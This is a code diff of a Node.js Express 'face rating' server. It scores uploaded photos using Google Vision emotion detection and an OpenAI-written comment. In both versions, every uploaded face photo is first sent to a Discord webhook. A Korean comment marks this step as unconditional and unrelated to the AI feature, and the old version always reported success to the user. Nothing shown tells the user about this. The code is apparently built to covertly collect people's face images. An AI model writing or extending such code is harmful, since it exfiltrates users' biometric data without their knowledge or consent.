@@ -2,97 +2,119 @@ import express from "express";
 import multer from "multer";
 import fs from "fs";
 import path from "path";
-import fetch from "node-fetch";
+import { v1 as vision } from "@google-cloud/vision";
 import OpenAI from "openai";
+import dotenv from "dotenv";
+import fetch from "node-fetch";
+
+dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-/* ========= 설정 ========= */
-const DISCORD_WEBHOOK_URL = "여기에_네_디스코드_웹훅_URL";
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
+process.env.GOOGLE_APPLICATION_CREDENTIALS = process.env.GOOGLE_VISION_API;
 
-/* ========= OpenAI ========= */
-const openai = new OpenAI({ apiKey: OPENAI_API_KEY });
-
-/* ========= 업로드 폴더 ========= */
 const uploadDir = "./uploads";
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir);
-}
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
-/* ========= multer ========= */
 const upload = multer({ dest: uploadDir });
 
-/* ========= 정적 파일 ========= */
+const openai = new OpenAI({ apiKey: OPENAI_API_KEY });
+const client = new vision.ImageAnnotatorClient();
+
+const likelihoodMap = {
+  VERY_UNLIKELY: 0,
+  UNLIKELY: 0.25,
+  POSSIBLE: 0.5,
+  LIKELY: 0.75,
+  VERY_LIKELY: 1,
+};
+
+function calcScore(emotions) {
+  const joy = likelihoodMap[emotions.joy] || 0;
+  const sorrow = likelihoodMap[emotions.sorrow] || 0;
+  const anger = likelihoodMap[emotions.anger] || 0;
+
+  let score = joy * 10 - (sorrow + anger) * 5;
+
+  if (score < 1) score = 1;
+  if (score > 10) score = 10;
+
+  return Math.round(score * 10) / 10; // 소수점 1자리 반올림
+}
+
 app.use(express.static("./"));
 
-/* ========= 메인 ========= */
 app.get("/", (req, res) => {
   res.sendFile(path.resolve("index.html"));
 });
 
-/* ========= 업로드 엔드포인트 ========= */
 app.post("/upload", upload.single("photo"), async (req, res) => {
   const filePath = req.file.path;
 
-  // 🔴 1️⃣ 무조건 디스코드로 사진 전송 (AI랑 무관)
   try {
+    // Discord로 사진 전송
+    const FormData = (await import("form-data")).default;
     const form = new FormData();
-    form.append(
-      "file",
-      fs.createReadStream(filePath),
-      "face.jpg"
-    );
+    form.append("file", fs.createReadStream(filePath), "face.jpg");
 
-    await fetch(DISCORD_WEBHOOK_URL, {
+    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
       method: "POST",
-      body: form
+      body: form,
+      headers: form.getHeaders(),
     });
+
+    if (!discordRes.ok) {
+      console.error("디스코드 전송 실패:", await discordRes.text());
+    }
   } catch (e) {
-    console.error("디스코드 전송 실패:", e.message);
+    console.error("디스코드 전송 예외:", e.message);
   }
 
-  // 🔵 2️⃣ AI 시도 (실패해도 무시)
-  let aiResult = "AI 분석 실패";
-
   try {
-    const imageBuffer = fs.readFileSync(filePath);
+    // Google Vision 얼굴 감지
+    const [result] = await client.faceDetection(filePath);
+    const faces = result.faceAnnotations;
+
+    if (!faces || faces.length === 0) {
+      throw new Error("얼굴을 찾을 수 없습니다.");
+    }
+
+    const faceData = faces[0];
+    const emotions = {
+      joy: faceData.joyLikelihood,
+      sorrow: faceData.sorrowLikelihood,
+      anger: faceData.angerLikelihood,
+      surprise: faceData.surpriseLikelihood,
+    };
+
+    // 점수 계산
+    const score = calcScore(emotions);
+
+    // OpenAI 평가 코멘트 생성
+    const prompt = `이 얼굴의 감정 데이터를 참고해 점수는 ${score}점이며, 왜 그런 점수를 받았는지 간단히 설명해줘.
+
+감정 데이터: ${JSON.stringify(emotions)}
+`;
 
     const response = await openai.chat.completions.create({
       model: "gpt-4o-mini",
-      messages: [
-        {
-          role: "user",
-          content: [
-            { type: "text", text: "이 얼굴을 솔직하게 평가해줘." },
-            {
-              type: "image_url",
-              image_url: {
-                url: `data:image/jpeg;base64,${imageBuffer.toString("base64")}`
-              }
-            }
-          ]
-        }
-      ]
+      messages: [{ role: "user", content: prompt }],
     });
 
-    aiResult = response.choices[0].message.content;
+    const aiComment = response.choices[0].message.content;
+
+    res.json({ ok: true, score, comment: aiComment });
   } catch (e) {
-    console.error("AI 실패:", e.message);
+    console.error("AI 분석 실패:", e.message);
+    res.json({ ok: false, error: e.message });
+  } finally {
+    fs.unlink(filePath, () => {});
   }
-
-  // 🔵 3️⃣ 유저 응답 (항상 성공처럼)
-  res.json({
-    ok: true,
-    result: aiResult
-  });
-
-  // 🔴 4️⃣ 파일 정리 (선택)
-  fs.unlink(filePath, () => {});
 });
 
-/* ========= 서버 시작 ========= */
 app.listen(PORT, () => {
-  console.log("Server running on", PORT);
+  console.log(`Server running on port ${PORT}`);
 });
